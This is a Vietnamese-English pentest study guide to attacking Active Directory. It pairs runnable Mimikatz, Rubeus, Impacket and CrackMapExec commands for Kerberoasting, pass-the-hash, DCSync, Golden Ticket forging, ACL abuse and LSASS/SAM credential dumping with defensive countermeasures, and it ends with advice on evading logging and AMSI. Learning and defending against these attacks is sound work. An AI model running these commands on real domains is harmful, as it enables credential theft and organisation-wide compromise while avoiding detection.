# Active Directory Security Deep Dive

> Phương pháp: What – How – Why – Components – Compare – Trade-offs – Real-world – Ghi chú

---

## 1. Active Directory Fundamentals

### What – Active Directory là gì?
AD là directory service của Microsoft, quản lý authentication và authorization trong Windows domains. **Mục tiêu chính trong corporate pentests** vì compromise AD = compromise toàn bộ tổ chức.

### How – AD Architecture

```
Active Directory Structure:
├── Forest (toàn bộ AD deployment)
│   └── Domain (contoso.local)
│       ├── Domain Controller (DC)
│       │   ├── NTDS.dit (database: users, groups, policies)
│       │   ├── SYSVOL (GPO, login scripts)
│       │   └── Kerberos KDC (Key Distribution Center)
│       ├── Organizational Units (OU)
│       │   ├── IT OU → IT_Users group → users
│       │   └── Finance OU → Finance_Users group → users
│       └── Group Policy Objects (GPO)

Authentication Protocols:
├── NTLM: challenge-response, legacy, weaker
└── Kerberos: ticket-based, modern, preferred

Objects:
├── User accounts
├── Computer accounts
├── Groups (Security Groups, Distribution Lists)
├── Service Accounts (SPN assigned)
└── Group Managed Service Accounts (gMSA)
```

---

## 2. Kerberos Authentication & Attacks

### How – Kerberos Flow

```
Kerberos Authentication:
1. Client → AS (Authentication Server): AS_REQ với timestamp (encrypted by user hash)
2. AS → Client: TGT (Ticket-Granting Ticket) encrypted by KDC key + Session Key
3. Client → TGS (Ticket-Granting Service): TGS_REQ với TGT
4. TGS → Client: Service Ticket encrypted by service account's NTLM hash
5. Client → Service: present Service Ticket → authenticated!

Key points:
- TGT valid 10 hours (mặc định)
- Service Ticket encrypted bằng SERVICE ACCOUNT HASH → có thể crack offline!
```

### How – Kerberoasting

```
Kerberoasting:
1. Request service tickets cho ALL service accounts có SPN
2. Service tickets được encrypt bằng service account's password hash
3. Extract tickets → crack offline
4. Không cần quyền cao → bất kỳ domain user nào có thể làm!
```

```powershell
# PowerView: enumerate service accounts với SPN
Import-Module .\PowerView.ps1
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname

# Invoke-Kerberoast: request và format tickets cho hashcat
Import-Module .\PowerView.ps1
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath hashes.txt

# Rubeus (Windows): kerberoast tất cả accounts
.\Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt

# Impacket (Linux): từ xa
GetUserSPNs.py contoso.local/user:password -dc-ip 192.168.1.10 -request
GetUserSPNs.py contoso.local/user:password -dc-ip 192.168.1.10 -request -outputfile hashes.txt

# Crack hashes (type 13100 = Kerberos TGS-REP)
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule

# Phòng thủ:
# 1. Service accounts dùng strong passwords (>25 ký tự ngẫu nhiên)
# 2. Dùng Group Managed Service Accounts (gMSA) → auto-rotate 120+ char password
# 3. Monitor Event ID 4769: Kerberos Service Ticket Operations
#    → nhiều requests type RC4 encryption → suspicious
# 4. Managed Service Accounts (MSA/gMSA) không thể Kerberoast
```

### How – AS-REP Roasting

```
AS-REP Roasting:
→ Accounts với "Do not require Kerberos preauthentication" bật
→ Request AS_REP mà không cần password
→ AS_REP encrypted bằng user's password hash → crack offline
→ Không cần domain credentials (khác Kerberoasting)!
```

```powershell
# Tìm vulnerable accounts
Get-DomainUser -PreauthNotRequired -Properties samaccountname

# Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# Impacket (từ Linux, không cần domain account)
GetNPUsers.py contoso.local/ -usersfile users.txt -no-pass -format hashcat
GetNPUsers.py contoso.local/ -dc-ip 192.168.1.10 -request -no-pass -format hashcat

# Crack (type 18200 = Kerberos AS-REP)
hashcat -m 18200 asrep_hashes.txt rockyou.txt

# Phòng thủ:
# - Bật Kerberos preauthentication cho TẤT CẢ accounts (mặc định bật)
# - Monitor Event ID 4768: Kerberos Authentication Service
```

---

## 3. NTLM Attacks

### How – Pass-the-Hash (PtH)

```
NTLM Authentication:
Server: challenge (random 8 bytes)
Client: response = HMAC-MD5(NT_hash, challenge)

→ Nếu có NT hash (không cần plaintext password), có thể authenticate!
```

```bash
# Dump hashes từ compromised machine
# Mimikatz (Windows, cần admin):
privilege::debug
sekurlsa::logonpasswords        # dump cleartext passwords + hashes từ LSASS
token::elevate
lsadump::sam                    # dump SAM database (local accounts)

# CrackMapExec: PtH để lateral movement
crackmapexec smb 192.168.1.0/24 -u Administrator -H 'NTLM_HASH' --shares
crackmapexec smb 192.168.1.50 -u Administrator -H 'NTLM_HASH' -x "whoami"
crackmapexec smb 192.168.1.50 -u Administrator -H 'NTLM_HASH' --sam  # dump hashes

# Impacket PtH tools
psexec.py contoso.local/Administrator@192.168.1.50 -hashes :NTLM_HASH
wmiexec.py contoso.local/Administrator@192.168.1.50 -hashes :NTLM_HASH
smbexec.py contoso.local/Administrator@192.168.1.50 -hashes :NTLM_HASH

# secretsdump: dump hashes từ xa
secretsdump.py contoso.local/Administrator@192.168.1.50 -hashes :NTLM_HASH

# Phòng thủ:
# - Local Administrator Password Solution (LAPS): unique admin password per machine
# - Credential Guard: protect LSASS bằng virtualization
# - Disable NTLMv1, enforce NTLMv2
# - Disable NTLM hoàn toàn nếu possible (dùng Kerberos)
# - Privileged Access Workstations (PAW) cho admins
```

### How – Pass-the-Ticket (PtT)

```bash
# Dump TGT từ memory
.\Rubeus.exe dump /service:krbtgt

# Export ticket
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt

# Import ticket vào session
.\Rubeus.exe ptt /ticket:base64_encoded_ticket

# Verify
klist                             # list current Kerberos tickets

# Mimikatz PtT
kerberos::list                    # list tickets
kerberos::ptt ticket.kirbi        # import ticket

# Phòng thủ:
# - Monitor Event 4768 (TGT request), 4769 (Service ticket), 4771 (preauth failed)
# - Short TGT lifetime
# - Protected Users Security Group: members không dùng NTLM, DES, RC4
```

---

## 4. DCSync Attack

### What – DCSync là gì?
Giả mạo là Domain Controller để yêu cầu DC replicate password hashes. Kết quả: dump toàn bộ NTDS.dit (tất cả domain hashes).

### How – DCSync

```bash
# Yêu cầu quyền: Replicating Directory Changes + Replicating Directory Changes All
# Thường cần: Domain Admin, Enterprise Admin, hoặc tạo custom delegation

# Mimikatz DCSync
lsadump::dcsync /domain:contoso.local /user:krbtgt  # dump krbtgt hash
lsadump::dcsync /domain:contoso.local /all           # dump ALL hashes

# Impacket secretsdump (từ Linux)
secretsdump.py contoso.local/DomainAdmin:Password123@192.168.1.10
secretsdump.py contoso.local/DomainAdmin:Password123@dc01.contoso.local -just-dc

# Output: SAM hashes của tất cả domain users
# contoso.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# Với krbtgt hash → Golden Ticket Attack!

# Phòng thủ:
# - Monitor Event ID 4662: Operation performed on object (Directory Service replication)
# - Limit accounts có DCSync rights (chỉ DCs cần)
# - Privileged Identity Management (PIM): JIT admin access
```

---

## 5. Golden Ticket & Silver Ticket

### How – Golden Ticket

```
Golden Ticket:
→ Dùng krbtgt hash để forge TGT
→ TGT là "golden": không cần DC để validate thêm nữa
→ Tồn tại 10 năm (mặc định), ngay cả khi đổi password user
→ Chỉ hết khi đổi krbtgt password 2 lần

Ingredients:
- krbtgt NTLM hash (từ DCSync/lsadump::sam)
- Domain SID
- Target username (thậm chí fake user)
- Domain name
```

```bash
# Get domain SID
Get-DomainSID
# hoặc:
wmic useraccount where name='Administrator' get sid
# → S-1-5-21-1234567890-1234567890-1234567890-500
# Domain SID = S-1-5-21-1234567890-1234567890-1234567890

# Mimikatz: forge Golden Ticket
kerberos::golden \
  /user:Administrator \
  /domain:contoso.local \
  /sid:S-1-5-21-1234567890-1234567890-1234567890 \
  /krbtgt:KRBTGT_NTLM_HASH \
  /id:500 \
  /groups:512,513,518,519,520 \
  /ptt                              # pass-the-ticket ngay lập tức

# Rubeus
.\Rubeus.exe golden /rc4:KRBTGT_HASH /domain:contoso.local /sid:DOMAIN_SID /user:FakeAdmin /ptt

# Với Golden Ticket: truy cập bất kỳ resource nào trong domain
dir \\dc01.contoso.local\c$
psexec \\dc01.contoso.local cmd

# Phòng thủ:
# - Reset krbtgt password 2 lần (interval > replication time)
# - Monitor: TGTs với unusual lifetimes hoặc từ unusual sources
# - Event ID 4769 với RC4 encryption type (mặc định Golden Ticket dùng RC4)
# - Microsoft ATA / Defender for Identity: detect Golden Ticket anomalies
```

### How – Silver Ticket

```bash
# Silver Ticket: forge Service Ticket dùng SERVICE ACCOUNT hash (không cần krbtgt)
# → Chỉ truy cập được 1 service cụ thể

# Ingredients:
# - Service account NTLM hash
# - Domain SID
# - SPN (Service Principal Name)

# Mimikatz Silver Ticket
kerberos::golden \
  /user:Administrator \
  /domain:contoso.local \
  /sid:DOMAIN_SID \
  /target:fileserver.contoso.local \
  /service:cifs \                   # service type: cifs, http, host, ldap, mssql
  /rc4:SERVICE_ACCOUNT_HASH \
  /ptt

# Lợi thế: không DC request → ít bị phát hiện hơn Golden Ticket
```

---

## 6. BloodHound – Attack Path Analysis

### What – BloodHound là gì?
BloodHound dùng graph theory để visualize và discover attack paths trong Active Directory. Hiển thị các đường tấn công từ unprivileged user → Domain Admin.

### How – BloodHound Setup

```bash
# 1. Cài BloodHound
sudo apt install bloodhound neo4j

# 2. Start Neo4j database
sudo neo4j console
# → đổi password: http://localhost:7474

# 3. Start BloodHound
bloodhound

# 4. Collect data với SharpHound (Windows, chạy với domain user)
.\SharpHound.exe -c All --zipfilename bloodhound.zip
.\SharpHound.exe -c All,GPOLocalGroup --zipfilename bloodhound.zip

# Từ Linux (không cần vào domain):
bloodhound-python -u user -p password -d contoso.local -dc dc01.contoso.local -c All

# 5. Import vào BloodHound: Upload Data button → chọn .zip

# BloodHound Queries:
# "Find all Domain Admins": Nodes → Domains → Admin Count
# "Shortest Paths to Domain Admins"
# "Find Shortest Paths to High Value Targets"
# "Kerberoastable Accounts"
# "ASREProastable Accounts"
```

### How – BloodHound Attack Paths

```
Common Attack Paths:
1. User → GenericAll → Computer → Local Admin → LAPS Password → DC
2. User → MemberOf → Group → AdminTo → Computer
3. User → HasSession → Computer (admin logged in) → credentials
4. User → WriteDACL → Group → AddMember → Domain Admins

ACL Attacks:
GenericAll     → full control over object
GenericWrite   → write any attribute
WriteOwner     → change object owner (then take ownership)
WriteDACL      → modify DACL (give yourself permissions)
AllExtendedRights → includes ForceChangePassword, AddMember
ForceChangePassword → change password without knowing current

Exploitation:
# GenericAll trên user → change password
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# GenericAll trên group → add member
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'compromiseduser'

# WriteDACL trên domain → give DCSync rights
Add-DomainObjectAcl -TargetIdentity 'DC=contoso,DC=local' \
  -PrincipalIdentity compromiseduser \
  -Rights DCSync
```

---

## 7. Credential Access

### How – LSASS Dumping

```powershell
# Mimikatz: most common method
privilege::debug
sekurlsa::logonpasswords

# Task Manager method (admin required):
# Task Manager → Details → lsass.exe → Create dump file
# → Lsass.exe.dmp
# Analyze với mimikatz:
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords

# Procdump (từ Sysinternals)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Comsvcs.dll method (LOLBin - Living off the Land)
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass_PID> lsass.dmp full

# Via Task Scheduler (nếu không có admin trực tiếp):
schtasks /create /tn "dump" /tr "rundll32.exe comsvcs.dll MiniDump <PID> C:\Windows\Temp\lsass.dmp full" /sc once /st 00:00

# Phòng thủ:
# - Credential Guard (PPL - Protected Process Light cho LSASS)
# - RunAsPPL registry key:
#   HKLM\SYSTEM\CurrentControlSet\Control\Lsa → RunAsPPL = 1
# - Windows Defender Credential Guard (Virtualization-based)
# - Event ID 10: Process Access (Sysmon) để monitor LSASS access
```

### How – SAM & Registry Dumping

```cmd
# Dump SAM database (local accounts)
reg save HKLM\SAM C:\sam.hive
reg save HKLM\SYSTEM C:\system.hive
reg save HKLM\SECURITY C:\security.hive

# Analyze offline
secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL

# Volume Shadow Copy bypass (khi files locked):
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\sam.hive
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system.hive
```

---

### Compare – Domain Escalation Paths

| Attack | Prerequisite | Access Gained | Detection Difficulty |
|--------|-------------|---------------|---------------------|
| Kerberoasting | Domain User | Service Acct (crack needed) | Medium |
| AS-REP Roasting | No auth | User (crack needed) | Medium |
| Pass-the-Hash | Local Admin + Hash | Target machine | High |
| Pass-the-Ticket | Valid TGT | Service access | Medium |
| DCSync | Replication rights | All domain hashes | Low (easy detect) |
| Golden Ticket | krbtgt hash | Entire domain forever | Low (ATA/Defender) |
| BloodHound path | Domain User | Domain Admin (multi-step) | Varies |

### Trade-offs
- Kerberoasting: tìm weak passwords nhưng cracking time phụ thuộc password strength và wordlist
- Golden Ticket: persistence mạnh nhưng cần reset krbtgt 2 lần để clean up
- BloodHound collection: rất nhiều LDAP queries → có thể bị phát hiện bởi logging/alerting

### Real-world Usage
```powershell
# Initial AD enumeration (domain user shell)
# 1. Domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
net user /domain
net group /domain
net group "Domain Admins" /domain

# 2. PowerView quick recon
Import-Module .\PowerView.ps1
Get-DomainController              # list DCs
Get-DomainUser -Properties name,memberof,admincount | Format-Table
Get-DomainGroup -AdminCount       # privileged groups
Get-DomainComputer -Properties name,operatingsystem | Format-Table
Find-LocalAdminAccess             # machines where current user is local admin
Get-NetLoggedon -ComputerName dc01  # who is logged on DC

# 3. Check BloodHound for quick wins
# Shortest Path to Domain Admins
# Kerberoastable accounts với admincount=1 (high value)

# OPSEC considerations:
# - PowerShell Script Block Logging → encoded commands
# - AMSI bypass trước khi load tools
# - Prefer native LDAP queries over noisy PowerView
# - Timestamp your actions để biết scope nếu detection xảy ra
```

### Ghi chú – Chủ đề tiếp theo
> Cloud Security – AWS IAM privilege escalation, IMDS attack, misconfiguration hunting với Scout Suite / Pacu

---

*Cập nhật lần cuối: 2026-05-06*
